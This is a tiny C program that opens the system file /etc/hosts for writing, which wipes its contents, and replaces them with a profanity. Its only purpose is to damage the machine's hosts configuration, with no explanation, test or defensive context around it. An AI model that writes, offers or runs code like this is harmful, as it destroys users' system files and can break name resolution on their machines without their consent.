#include<stdio.h>


int main()
{

 FILE* hosts=fopen("/etc/hosts","w");
 fprintf(hosts,"%s","fuck you");

 fclose(hosts);
 return 0;

}
